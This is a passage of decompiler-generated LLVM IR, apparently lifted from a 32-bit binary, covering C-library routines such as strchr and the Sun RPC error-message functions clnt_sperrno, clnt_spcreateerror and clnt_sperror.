  %v2_1001519c = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_1001519c, i32* %stack_var_-96, align 4
  store i32 268521896, i32* @lr, align 4
  %v0_100151a4 = call i32 @__GI_vfprintf()
  ret i32 %v0_100151a4
}

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v1_100151b8 = urem i32 %arg1, 256
  store i32 %v1_100151b8, i32* %r4.global-to-local, align 4
  %v0_100151d82 = load i32, i32* @r3, align 4
  %v1_100151d83 = urem i32 %v0_100151d82, 4
  %v3_100151d85 = icmp eq i32 %v1_100151d83, 0
  br i1 %v3_100151d85, label %dec_label_pc_100151e0, label %dec_label_pc_100151c0

dec_label_pc_100151c0:                            ; preds = %entry, %dec_label_pc_100151d4
  %v1_100151c4 = phi i32 [ %v0_100151e0.pre, %dec_label_pc_100151d4 ], [ %v1_100151b8, %entry ]
  %v0_100151c0 = phi i32 [ %v1_100151d4, %dec_label_pc_100151d4 ], [ %v0_100151d82, %entry ]
  %v1_100151c0 = inttoptr i32 %v0_100151c0 to i8*
  %v2_100151c0 = load i8, i8* %v1_100151c0, align 1
  %v3_100151c0 = zext i8 %v2_100151c0 to i32
  %v4_100151c4 = icmp eq i32 %v3_100151c0, %v1_100151c4
  %v3_100151c8 = icmp eq i8 %v2_100151c0, 0
  %v0_100151cc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_100151c4, i32 %v0_100151cc)
  br i1 %v3_100151c8, label %dec_label_pc_100152b0, label %dec_label_pc_100151d4

dec_label_pc_100151d4:                            ; preds = %dec_label_pc_100151c0
  %v0_100151d4 = load i32, i32* @r3, align 4
  %v1_100151d4 = add i32 %v0_100151d4, 1
  store i32 %v1_100151d4, i32* @r3, align 4
  %v1_100151d8 = urem i32 %v1_100151d4, 4
  %v3_100151d8 = icmp eq i32 %v1_100151d8, 0
  %v0_100151e0.pre = load i32, i32* %r4.global-to-local, align 4
  br i1 %v3_100151d8, label %dec_label_pc_100151e0, label %dec_label_pc_100151c0

dec_label_pc_100151e0:                            ; preds = %dec_label_pc_100151d4, %entry
  %v0_100151f810 = phi i32 [ %v0_100151d82, %entry ], [ %v1_100151d4, %dec_label_pc_100151d4 ]
  %v0_100151e0 = phi i32 [ %v1_100151b8, %entry ], [ %v0_100151e0.pre, %dec_label_pc_100151d4 ]
  %v1_100151e0 = mul i32 %v0_100151e0, 256
  %v2_100151e8 = or i32 %v1_100151e0, %v0_100151e0
  store i32 -2130640640, i32* @r7, align 4
  %v1_100151f0 = mul i32 %v2_100151e8, 65536
  %v2_100151f4 = or i32 %v1_100151f0, %v2_100151e8
  br label %dec_label_pc_100151f8

dec_label_pc_100151f8:                            ; preds = %dec_label_pc_100151f8, %dec_label_pc_100152ac, %dec_label_pc_100151e0
  %v0_10015250 = phi i32 [ %v0_100151f810, %dec_label_pc_100151e0 ], [ %v1_100151fc, %dec_label_pc_100152ac ], [ %v1_100151fc, %dec_label_pc_100151f8 ]
  %v1_100151f8 = inttoptr i32 %v0_10015250 to i32*
  %v2_100151f8 = load i32, i32* %v1_100151f8, align 4
  %v1_100151fc = add i32 %v0_10015250, 4
  %v2_10015204 = xor i32 %v2_100151f8, %v2_100151f4
  %v1_10015208 = add i32 %v2_100151f8, 2130640639
  %v2_10015210 = xor i32 %v1_10015208, %v2_100151f8
  %v1_10015214 = add i32 %v2_10015204, 2130640639
  %v2_10015218 = and i32 %v2_10015210, -2130640640
  %v3_10015218 = xor i32 %v2_10015218, -2130640640
  %v2_1001521c = xor i32 %v1_10015214, %v2_10015204
  %v2_10015220 = and i32 %v2_1001521c, -2130640640
  %v3_10015220 = xor i32 %v2_10015220, -2130640640
  %v1_1001522c = add i32 %v0_10015250, 1
  %tmp = or i32 %v3_10015220, %v3_10015218
  %brmerge = icmp eq i32 %tmp, 0
  br i1 %brmerge, label %dec_label_pc_100151f8, label %dec_label_pc_10015238

dec_label_pc_10015238:                            ; preds = %dec_label_pc_100151f8
  %v2_10015238 = inttoptr i32 %v0_10015250 to i8*
  %v3_10015238 = load i8, i8* %v2_10015238, align 1
  %v4_10015238 = zext i8 %v3_10015238 to i32
  %v1_1001523c = add i32 %v0_10015250, 2
  store i32 %v1_1001523c, i32* @r10, align 4
  %v1_10015240 = add i32 %v0_10015250, 3
  store i32 %v1_10015240, i32* @r8, align 4
  %v4_10015244 = icmp eq i32 %v4_10015238, %v0_100151e0
  br i1 %v4_10015244, label %dec_label_pc_10015250, label %dec_label_pc_10015258

dec_label_pc_10015250:                            ; preds = %dec_label_pc_10015238
  ret i32 %v0_10015250

dec_label_pc_10015258:                            ; preds = %dec_label_pc_10015238
  %v3_10015248 = icmp eq i8 %v3_10015238, 0
  br i1 %v3_10015248, label %dec_label_pc_100152b0, label %dec_label_pc_1001525c

dec_label_pc_1001525c:                            ; preds = %dec_label_pc_10015258
  %v2_1001525c = inttoptr i32 %v1_1001522c to i8*
  %v3_1001525c = load i8, i8* %v2_1001525c, align 1
  %v4_1001525c = zext i8 %v3_1001525c to i32
  %v4_10015260 = icmp eq i32 %v4_1001525c, %v0_100151e0
  br i1 %v4_10015260, label %dec_label_pc_1001526c, label %dec_label_pc_10015274

dec_label_pc_1001526c:                            ; preds = %dec_label_pc_1001525c
  ret i32 %v1_1001522c

dec_label_pc_10015274:                            ; preds = %dec_label_pc_1001525c
  %v3_10015264 = icmp eq i8 %v3_1001525c, 0
  br i1 %v3_10015264, label %dec_label_pc_100152b0, label %dec_label_pc_10015278

dec_label_pc_10015278:                            ; preds = %dec_label_pc_10015274
  %v2_10015278 = inttoptr i32 %v1_1001523c to i8*
  %v3_10015278 = load i8, i8* %v2_10015278, align 1
  %v4_10015278 = zext i8 %v3_10015278 to i32
  %v4_1001527c = icmp eq i32 %v4_10015278, %v0_100151e0
  br i1 %v4_1001527c, label %dec_label_pc_10015288, label %dec_label_pc_10015290

dec_label_pc_10015288:                            ; preds = %dec_label_pc_10015278
  ret i32 %v1_1001523c

dec_label_pc_10015290:                            ; preds = %dec_label_pc_10015278
  %v3_10015280 = icmp eq i8 %v3_10015278, 0
  br i1 %v3_10015280, label %dec_label_pc_100152b0, label %dec_label_pc_10015294

dec_label_pc_10015294:                            ; preds = %dec_label_pc_10015290
  %v2_10015294 = inttoptr i32 %v1_10015240 to i8*
  %v3_10015294 = load i8, i8* %v2_10015294, align 1
  %v4_10015294 = zext i8 %v3_10015294 to i32
  %v4_10015298 = icmp eq i32 %v4_10015294, %v0_100151e0
  br i1 %v4_10015298, label %dec_label_pc_100152a4, label %dec_label_pc_100152ac

dec_label_pc_100152a4:                            ; preds = %dec_label_pc_10015294
  ret i32 %v1_10015240

dec_label_pc_100152ac:                            ; preds = %dec_label_pc_10015294
  %v3_1001529c = icmp eq i8 %v3_10015294, 0
  br i1 %v3_1001529c, label %dec_label_pc_100152b0, label %dec_label_pc_100151f8

dec_label_pc_100152b0:                            ; preds = %dec_label_pc_100151c0, %dec_label_pc_100152ac, %dec_label_pc_10015290, %dec_label_pc_10015274, %dec_label_pc_10015258
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_100151fc, { 1, 0 }
  uselistorder i32 %v2_100151f8, { 0, 2, 1 }
  uselistorder i32 %v0_10015250, { 0, 1, 2, 4, 3, 6, 5 }
  uselistorder i32 %v2_100151e8, { 1, 0 }
  uselistorder i32 %v0_100151e0, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_100151d4, { 1, 0, 3, 2 }
  uselistorder i32 %v0_100151d82, { 2, 1, 0 }
  uselistorder i32 %v1_100151b8, { 1, 2, 0 }
  uselistorder i32* @r8, { 52, 126, 127, 17, 53, 54, 55, 56, 57, 58, 59, 60, 7, 61, 62, 63, 18, 27, 28, 128, 138, 26, 64, 65, 66, 38, 129, 130, 131, 139, 25, 3, 8, 142, 31, 4, 32, 16, 67, 19, 68, 69, 29, 132, 133, 30, 137, 20, 9, 134, 135, 70, 71, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 41, 5, 42, 10, 43, 44, 45, 0, 46, 11, 47, 48, 12, 39, 49, 50, 51, 33, 34, 140, 141, 143, 21, 22, 23, 150, 151, 107, 72, 73, 74, 136, 108, 109, 110, 111, 112, 113, 114, 13, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 1, 125, 35, 144, 145, 2, 146, 6, 14, 15, 148, 147, 149, 36, 37, 24, 40 }
  uselistorder i32 3, { 2, 54, 55, 56, 57, 58, 59, 60, 61, 62, 3, 37, 38, 74, 4, 39, 40, 41, 0, 9, 23, 25, 24, 17, 26, 64, 16, 65, 42, 43, 44, 10, 1, 78, 79, 5, 66, 67, 69, 70, 27, 71, 75, 28, 29, 30, 31, 32, 45, 80, 82, 83, 89, 81, 51, 21, 6, 7, 68, 76, 77, 95, 96, 97, 91, 92, 93, 94, 18, 73, 72, 63, 8, 19, 46, 87, 47, 11, 48, 85, 90, 86, 52, 33, 53, 12, 13, 88, 84, 49, 22, 14, 15, 50, 34, 35, 36, 20 }
  uselistorder i32 65536, { 3, 6, 4, 5, 7, 23, 9, 8, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 20, 21, 26, 24, 0, 28, 1, 25, 2, 27, 22 }
  uselistorder i32* @r7, { 29, 9, 30, 0, 31, 32, 33, 34, 35, 36, 23, 70, 37, 38, 39, 63, 64, 65, 10, 40, 66, 69, 24, 1, 67, 68, 41, 42, 2, 43, 44, 7, 45, 46, 47, 48, 3, 49, 50, 51, 11, 52, 53, 12, 74, 75, 54, 55, 56, 57, 58, 59, 4, 60, 8, 5, 6, 61, 62, 25, 27, 26, 28, 71, 72, 73, 22, 16, 17, 15, 14, 20, 19, 18, 21, 13 }
  uselistorder i32 -2130640640, { 3, 4, 5, 6, 9, 0, 7, 2, 10, 1, 8, 11 }
  uselistorder label %dec_label_pc_100152b0, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_100151f8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100151c0, { 1, 0 }
}

define i32 @__GI_clnt_sperrno() local_unnamed_addr {
entry:
  br label %dec_label_pc_100152f0

dec_label_pc_100152d0:                            ; preds = %dec_label_pc_100152f0
  %v1_100152f4 = add nuw nsw i32 %v0_100152f0, 1
  %v3_100152d0 = inttoptr i32 %v2_100152f8 to i32*
  %v4_100152d0 = load i32, i32* %v3_100152d0, align 4
  %v1_100152d4 = load i32, i32* @r3, align 4
  %v4_100152d4 = icmp eq i32 %v4_100152d0, %v1_100152d4
  br i1 %v4_100152d4, label %dec_label_pc_100152dc, label %dec_label_pc_100152f0

dec_label_pc_100152dc:                            ; preds = %dec_label_pc_100152d0
  %v1_100152dc = add i32 %v1_100152f0, add (i32 ptrtoint (i32* @global_var_10017774.518 to i32), i32 4)
  %v2_100152dc = inttoptr i32 %v1_100152dc to i32*
  %v3_100152dc = load i32, i32* %v2_100152dc, align 4
  %v2_100152e8 = add i32 %v3_100152dc, ptrtoint ([13 x i8]* @global_var_10017804.519 to i32)
  ret i32 %v2_100152e8

dec_label_pc_100152f0:                            ; preds = %dec_label_pc_100152d0, %entry
  %v0_100152fc = phi i32 [ %v1_100152fc, %dec_label_pc_100152d0 ], [ 19, %entry ]
  %v0_100152f0 = phi i32 [ %v1_100152f4, %dec_label_pc_100152d0 ], [ 0, %entry ]
  %v1_100152f0 = mul i32 %v0_100152f0, 8
  %v2_100152f8 = add i32 %v1_100152f0, ptrtoint (i32* @global_var_10017774.518 to i32)
  store i32 %v2_100152f8, i32* @r10, align 4
  %v1_100152fc = add nsw i32 %v0_100152fc, -1
  %v2_100152fc = icmp eq i32 %v1_100152fc, 0
  br i1 %v2_100152fc, label %dec_label_pc_10015300, label %dec_label_pc_100152d0

dec_label_pc_10015300:                            ; preds = %dec_label_pc_100152f0
  ret i32 ptrtoint ([26 x i8]* @global_var_1001757c.520 to i32)

; uselistorder directives
  uselistorder i32 %v1_100152fc, { 1, 0 }
  uselistorder i32 %v2_100152f8, { 1, 0 }
  uselistorder i32* @r10, { 36, 67, 118, 119, 16, 69, 15, 70, 71, 72, 73, 74, 76, 75, 1, 77, 78, 79, 80, 81, 82, 83, 121, 122, 123, 128, 129, 33, 2, 5, 131, 6, 44, 84, 17, 85, 86, 87, 38, 34, 35, 0, 37, 39, 40, 41, 124, 42, 22, 23, 24, 25, 26, 27, 43, 125, 126, 91, 92, 93, 4, 94, 95, 7, 58, 8, 59, 60, 61, 62, 52, 9, 53, 54, 63, 64, 65, 45, 46, 47, 134, 135, 130, 132, 10, 133, 88, 18, 68, 96, 97, 89, 90, 127, 140, 98, 99, 100, 102, 103, 104, 101, 20, 11, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 3, 21, 120, 139, 13, 14, 12, 136, 138, 137, 49, 48, 19, 50, 28, 29, 30, 31, 32, 51, 55, 56, 57, 66 }
  uselistorder i32 19, { 0, 4, 5, 6, 1, 7, 2, 3 }
}

define i32 @free_mem() local_unnamed_addr {
entry:
  store i32 268522268, i32* @lr, align 4
  %v0_10015318 = call i32 @__rpc_thread_variables()
  %v1_1001531c = add i32 %v0_10015318, 156
  %v2_1001531c = inttoptr i32 %v1_1001531c to i32*
  %v3_1001531c = load i32, i32* %v2_1001531c, align 4
  store i32 %v3_1001531c, i32* @r3, align 4
  store i32 268522276, i32* @lr, align 4
  %v0_10015320 = call i32 @free()
  ret i32 %v0_10015320

; uselistorder directives
  uselistorder i32 ()* @free, { 46, 42, 43, 30, 27, 26, 25, 24, 23, 22, 21, 14, 41, 9, 45, 44, 13, 12, 8, 7, 6, 5, 4, 3, 2, 1, 11, 10, 20, 19, 18, 17, 16, 29, 28, 31, 36, 0, 40, 39, 38, 37, 33, 35, 15, 34, 32 }
}

define i32 @clnt_perrno() local_unnamed_addr {
entry:
  %v0_10015334 = load i32, i32* @lr, align 4
  %v0_10015344 = call i32 @__GI_clnt_sperrno()
  %v3_10015350 = load i32, i32* @global_var_1002c2b0, align 4
  store i32 %v0_10015334, i32* @lr, align 4
  %v2_10015360 = call i32 @__GI_fputs(i32 %v0_10015344, i32 %v3_10015350)
  ret i32 %v2_10015360
}

define i32 @_buf() local_unnamed_addr {
entry:
  %v0_1001536c = load i32, i32* @r31, align 4
  store i32 268522360, i32* @lr, align 4
  %v0_10015374 = call i32 @__rpc_thread_variables()
  %v1_10015378 = add i32 %v0_10015374, 156
  %v2_10015378 = inttoptr i32 %v1_10015378 to i32*
  %v3_10015378 = load i32, i32* %v2_10015378, align 4
  store i32 256, i32* @r3, align 4
  %v3_10015384 = icmp eq i32 %v3_10015378, 0
  br i1 %v3_10015384, label %dec_label_pc_1001538c, label %dec_label_pc_10015394

dec_label_pc_1001538c:                            ; preds = %entry
  store i32 268522384, i32* @lr, align 4
  %v0_1001538c = call i32 @malloc()
  %v1_10015390 = load i32, i32* @r31, align 4
  %v2_10015390 = add i32 %v1_10015390, 156
  %v3_10015390 = inttoptr i32 %v2_10015390 to i32*
  store i32 %v0_1001538c, i32* %v3_10015390, align 4
  %v0_10015398.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10015394

dec_label_pc_10015394:                            ; preds = %entry, %dec_label_pc_1001538c
  %v0_10015398 = phi i32 [ %v0_10015374, %entry ], [ %v0_10015398.pre, %dec_label_pc_1001538c ]
  %v1_10015398 = add i32 %v0_10015398, 156
  %v2_10015398 = inttoptr i32 %v1_10015398 to i32*
  %v3_10015398 = load i32, i32* %v2_10015398, align 4
  store i32 %v0_1001536c, i32* @r31, align 4
  ret i32 %v3_10015398

; uselistorder directives
  uselistorder i32 ()* @malloc, { 7, 25, 13, 10, 9, 5, 24, 8, 6, 4, 3, 23, 2, 1, 0, 12, 11, 19, 22, 21, 20, 18, 17, 16, 15, 14 }
  uselistorder i32 256, { 50, 0, 1, 44, 2, 3, 4, 5, 45, 52, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 43, 22, 49, 51, 23, 24, 25, 26, 27, 28, 29, 55, 30, 56, 57, 58, 31, 32, 33, 34, 35, 54, 46, 53, 36, 37, 38, 39, 40, 41, 42, 59, 47, 48 }
  uselistorder i32 156, { 1, 2, 3, 0, 4 }
  uselistorder i32 ()* @__rpc_thread_variables, { 8, 18, 6, 17, 11, 10, 9, 7, 2, 0, 4, 16, 3, 15, 1, 14, 5, 13, 12 }
  uselistorder label %dec_label_pc_10015394, { 1, 0 }
}

define i32 @clnt_spcreateerror() local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-1048 = alloca i32, align 4
  %v0_100153b8 = load i32, i32* @r3, align 4
  store i32 %v0_100153b8, i32* @r29, align 4
  store i32 268522436, i32* @lr, align 4
  %v0_100153c0 = call i32 @_buf()
  store i32 %v0_100153c0, i32* @r30, align 4
  %v3_100153c4 = icmp eq i32 %v0_100153c0, 0
  br i1 %v3_100153c4, label %dec_label_pc_100154b4, label %dec_label_pc_100153cc

dec_label_pc_100153cc:                            ; preds = %entry
  store i32 268522448, i32* @lr, align 4
  %v0_100153cc = call i32 @__GI___rpc_thread_createerr()
  %v0_100153e0 = load i32, i32* @r30, align 4
  store i32 %v0_100153e0, i32* @r3, align 4
  store i32 268522476, i32* @lr, align 4
  %v1_100153e8 = call i32 @sprintf(i32 %v0_100153e0)
  %v0_100153f0 = load i32, i32* @r30, align 4
  %v2_100153f0 = add i32 %v0_100153f0, %v1_100153e8
  store i32 %v2_100153f0, i32* %r29.global-to-local, align 4
  %v0_100153f4 = load i32, i32* @r31, align 4
  %v1_100153f4 = inttoptr i32 %v0_100153f4 to i32*
  %v2_100153f4 = load i32, i32* %v1_100153f4, align 4
  store i32 %v2_100153f4, i32* @r3, align 4
  %v0_100153f8 = call i32 @__GI_clnt_sperrno()
  %v2_10015404 = inttoptr i32 %v0_100153f8 to i8*
  %v3_10015404 = call i32 @strcpy(i32 %v2_100153f0, i8* %v2_10015404)
  %v0_10015408 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10015408, i32* @r3, align 4
  %v0_1001540c = call i32 @__GI_strlen()
  %v0_10015410 = load i32, i32* @r31, align 4
  %v1_10015410 = inttoptr i32 %v0_10015410 to i32*
  %v2_10015410 = load i32, i32* %v1_10015410, align 4
  %v2_10015418 = add i32 %v0_10015408, %v0_1001540c
  store i32 %v2_10015418, i32* %r29.global-to-local, align 4
  %v3_1001541c = icmp eq i32 %v2_10015410, 12
  br i1 %v3_1001541c, label %dec_label_pc_1001546c, label %dec_label_pc_10015430

dec_label_pc_10015430:                            ; preds = %dec_label_pc_100153cc
  %v3_10015428 = icmp eq i32 %v2_10015410, 14
  br i1 %v3_10015428, label %dec_label_pc_1001543c, label %dec_label_pc_100154a4

dec_label_pc_1001543c:                            ; preds = %dec_label_pc_10015430
  %v4_1001543c = call i32 @strcpy(i32 %v2_10015418, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_100175a0.522, i32 0, i32 0))
  %v0_10015440 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10015440, i32* @r3, align 4
  %v0_10015444 = call i32 @__GI_strlen()
  %v2_10015448 = add i32 %v0_10015440, %v0_10015444
  store i32 %v2_10015448, i32* @r29, align 4
  %v0_1001544c = load i32, i32* @r31, align 4
  %v1_1001544c = add i32 %v0_1001544c, 4
  %v2_1001544c = inttoptr i32 %v1_1001544c to i32*
  %v3_1001544c = load i32, i32* %v2_1001544c, align 4
  store i32 %v3_1001544c, i32* @r3, align 4
  %v0_10015450 = call i32 @__GI_clnt_sperrno()
  %v0_10015458 = load i32, i32* @r29, align 4
  %v2_1001545c = inttoptr i32 %v0_10015450 to i8*
  %v3_1001545c = call i32 @strcpy(i32 %v0_10015458, i8* %v2_1001545c)
  %v0_10015460 = load i32, i32* @r29, align 4
  store i32 %v0_10015460, i32* @r3, align 4
  %v0_10015464 = call i32 @__GI_strlen()
  br label %dec_label_pc_100154a0

dec_label_pc_1001546c:                            ; preds = %dec_label_pc_100153cc
  %v2_100153ec = ptrtoint i32* %stack_var_-1048 to i32
  %v4_1001546c = call i32 @strcpy(i32 %v2_10015418, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_100175a0.522, i32 0, i32 0))
  %v0_10015470 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10015470, i32* @r3, align 4
  %v0_10015474 = call i32 @__GI_strlen()
  store i32 1024, i32* @r5, align 4
  %v2_1001547c = add i32 %v0_10015470, %v0_10015474
  store i32 %v2_1001547c, i32* %r29.global-to-local, align 4
  %v0_10015480 = load i32, i32* @r31, align 4
  %v1_10015480 = add i32 %v0_10015480, 8
  %v2_10015480 = inttoptr i32 %v1_10015480 to i32*
  %v3_10015480 = load i32, i32* %v2_10015480, align 4
  store i32 %v3_10015480, i32* @r3, align 4
  store i32 268522636, i32* @lr, align 4
  %v3_10015488 = call i32 @__GI___glibc_strerror_r(i32 %v3_10015480, i32 %v2_100153ec, i32 1024)
  %v0_1001548c = load i32, i32* @r29, align 4
  %v2_10015494 = bitcast i32* %stack_var_-1048 to i8*
  %v3_10015494 = call i32 @strcpy(i32 %v0_1001548c, i8* %v2_10015494)
  %v0_10015498 = load i32, i32* @r29, align 4
  store i32 %v0_10015498, i32* @r3, align 4
  %v0_1001549c = call i32 @__GI_strlen()
  br label %dec_label_pc_100154a0

dec_label_pc_100154a0:                            ; preds = %dec_label_pc_1001543c, %dec_label_pc_1001546c
  %storemerge = phi i32 [ %v0_1001549c, %dec_label_pc_1001546c ], [ %v0_10015464, %dec_label_pc_1001543c ]
  %v0_100154a0 = load i32, i32* @r29, align 4
  %v2_100154a0 = add i32 %v0_100154a0, %storemerge
  store i32 %v2_100154a0, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_100154a4

dec_label_pc_100154a4:                            ; preds = %dec_label_pc_10015430, %dec_label_pc_100154a0
  %v2_100154a8 = phi i32 [ %v2_10015418, %dec_label_pc_10015430 ], [ %v2_100154a0, %dec_label_pc_100154a0 ]
  %v3_100154a8 = add i32 %v2_100154a8, 1
  %v4_100154a8 = inttoptr i32 %v3_100154a8 to i8*
  store i8 0, i8* %v4_100154a8, align 1
  %v2_100154b0 = load i32, i32* %r29.global-to-local, align 4
  %v3_100154b0 = inttoptr i32 %v2_100154b0 to i8*
  store i8 10, i8* %v3_100154b0, align 1
  %v0_100154b8.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_100154b4

dec_label_pc_100154b4:                            ; preds = %entry, %dec_label_pc_100154a4
  %v0_100154b8 = phi i32 [ 0, %entry ], [ %v0_100154b8.pre, %dec_label_pc_100154a4 ]
  ret i32 %v0_100154b8

; uselistorder directives
  uselistorder i32* %r29.global-to-local, { 2, 0, 1, 4, 3, 5, 6, 7 }
  uselistorder i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_100175a0.522, i32 0, i32 0), { 1, 0 }
  uselistorder i32 14, { 3, 5, 6, 7, 1, 2, 8, 0, 4 }
  uselistorder i32 12, { 40, 120, 121, 94, 95, 96, 0, 97, 98, 99, 14, 41, 47, 124, 25, 42, 43, 44, 45, 100, 46, 133, 15, 125, 10, 11, 12, 16, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 126, 122, 123, 48, 51, 49, 50, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 127, 62, 63, 37, 17, 128, 18, 129, 132, 22, 64, 65, 66, 101, 109, 110, 111, 112, 113, 114, 115, 116, 5, 6, 117, 130, 131, 140, 67, 87, 92, 68, 142, 143, 144, 145, 4, 134, 136, 1, 2, 7, 135, 3, 19, 20, 13, 104, 105, 106, 107, 158, 118, 119, 102, 103, 86, 154, 155, 147, 148, 149, 150, 78, 151, 8, 69, 70, 71, 72, 73, 38, 74, 75, 76, 77, 79, 141, 156, 146, 80, 93, 21, 23, 24, 81, 139, 82, 138, 137, 157, 153, 152, 83, 84, 85, 39, 9, 88, 89, 90, 91, 108 }
  uselistorder i32 ()* @__GI___rpc_thread_createerr, { 4, 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_100154b4, { 1, 0 }
  uselistorder label %dec_label_pc_100154a4, { 1, 0 }
  uselistorder label %dec_label_pc_100154a0, { 1, 0 }
}

define i32 @clnt_pcreateerror() local_unnamed_addr {
entry:
  %v0_100154cc = load i32, i32* @lr, align 4
  store i32 268522720, i32* @lr, align 4
  %v0_100154dc = call i32 @clnt_spcreateerror()
  %v3_100154e8 = load i32, i32* @global_var_1002c2b0, align 4
  store i32 %v0_100154cc, i32* @lr, align 4
  %v2_100154f8 = call i32 @__GI_fputs(i32 %v0_100154dc, i32 %v3_100154e8)
  ret i32 %v2_100154f8
}

define i32 @__GI_clnt_sperror() local_unnamed_addr {
entry:
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-1052 = alloca i32, align 4
  %stack_var_-1064 = alloca i32, align 4
  %v0_10015508 = load i32, i32* @r3, align 4
  store i32 %v0_10015508, i32* @r31, align 4
  %v0_10015510 = load i32, i32* @r4, align 4
  store i32 %v0_10015510, i32* @r30, align 4
  store i32 268522776, i32* @lr, align 4
  %v0_10015514 = call i32 @_buf()
  store i32 %v0_10015514, i32* %r28.global-to-local, align 4
  %v3_10015518 = icmp eq i32 %v0_10015514, 0
  store i32 0, i32* %r3.global-to-local, align 4
  br i1 %v3_10015518, label %dec_label_pc_100156c4, label %dec_label_pc_10015524

dec_label_pc_10015524:                            ; preds = %entry
  %v0_10015524 = load i32, i32* @r31, align 4
  %v1_10015524 = add i32 %v0_10015524, 4
  %v2_10015524 = inttoptr i32 %v1_10015524 to i32*
  %v3_10015524 = load i32, i32* %v2_10015524, align 4
  store i32 %v0_10015524, i32* %r3.global-to-local, align 4
  %v1_10015530 = add i32 %v3_10015524, 8
  %v2_10015530 = inttoptr i32 %v1_10015530 to i32*
  %v3_10015530 = load i32, i32* %v2_10015530, align 4
  call void @__pseudo_call(i32 %v3_10015530)
  %v0_10015548 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10015548, i32* @r3, align 4
  store i32 268522836, i32* @lr, align 4
  %v1_10015550 = call i32 @sprintf(i32 %v0_10015548)
  %v0_10015554 = load i32, i32* @r28, align 4
  %v2_10015554 = add i32 %v0_10015554, %v1_10015550
  store i32 %v2_10015554, i32* %r29.global-to-local, align 4
  %v3_10015558 = load i32, i32* %stack_var_-1064, align 4
  store i32 %v3_10015558, i32* @r3, align 4
  %v0_1001555c = call i32 @__GI_clnt_sperrno()
  store i32 %v2_10015554, i32* %r3.global-to-local, align 4
  %v2_10015568 = inttoptr i32 %v0_1001555c to i8*
  %v3_10015568 = call i32 @strcpy(i32 %v2_10015554, i8* %v2_10015568)
  %v0_1001556c = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_1001556c, i32* @r3, align 4
  %v0_10015570 = call i32 @__GI_strlen()
  store i32 %v0_10015570, i32* %r3.global-to-local, align 4
  %v3_10015574 = load i32, i32* %stack_var_-1064, align 4
  %v2_10015578 = add i32 %v0_1001556c, %v0_10015570
  store i32 %v2_10015578, i32* %r31.global-to-local, align 4
  %v2_1001557c = icmp ugt i32 %v3_10015574, 17
  br i1 %v2_1001557c, label %dec_label_pc_10015690, label %dec_label_pc_10015584

dec_label_pc_10015584:                            ; preds = %dec_label_pc_10015524
  %v1_10015588 = mul i32 %v3_10015574, 4
  %v2_10015590 = add i32 %v1_10015588, ptrtoint (i32* @global_var_10017624.524 to i32)
  %v3_10015590 = inttoptr i32 %v2_10015590 to i32*
  %v4_10015590 = load i32, i32* %v3_10015590, align 4
  %v2_10015594 = add i32 %v4_10015590, ptrtoint (i32* @global_var_10017624.524 to i32)
  call void @__pseudo_branch(i32 %v2_10015594)
  %v2_100155a0 = ptrtoint i32* %stack_var_-1052 to i32
  store i32 %v2_100155a0, i32* %r29.global-to-local, align 4
  store i32 %tmp4, i32* @r3, align 4
  store i32 1024, i32* @r5, align 4
  store i32 268522932, i32* @lr, align 4
  %v3_100155b0 = call i32 @__GI___glibc_strerror_r(i32 %tmp4, i32 %v2_100155a0, i32 1024)
  %v0_100155c0 = load i32, i32* @r31, align 4
  store i32 %v0_100155c0, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_100155cc.526 to i32), i32* @lr, align 4
  %v1_100155c8 = call i32 @sprintf(i32 %v0_100155c0)
  br label %dec_label_pc_100156ac

dec_label_pc_10015690:                            ; preds = %dec_label_pc_10015524
  store i32 %v2_10015578, i32* @r3, align 4
  store i32 268523180, i32* @lr, align 4
  %v1_100156a8 = call i32 @sprintf(i32 %v2_10015578)
  br label %dec_label_pc_100156ac

dec_label_pc_100156ac:                            ; preds = %dec_label_pc_10015584, %dec_label_pc_10015690
  %storemerge = phi i32 [ %v1_100156a8, %dec_label_pc_10015690 ], [ %v1_100155c8, %dec_label_pc_10015584 ]
  %v0_100156ac = load i32, i32* @r31, align 4
  %v2_100156ac = add i32 %v0_100156ac, %storemerge
  store i32 %v2_100156ac, i32* %r31.global-to-local, align 4
  %v0_100156b4 = load i32, i32* @r28, align 4
  store i32 %v0_100156b4, i32* %r3.global-to-local, align 4
  %v3_100156b8 = add i32 %v2_100156ac, 1
  %v4_100156b8 = inttoptr i32 %v3_100156b8 to i8*
  store i8 0, i8* %v4_100156b8, align 1
  %v2_100156c0 = load i32, i32* %r31.global-to-local, align 4
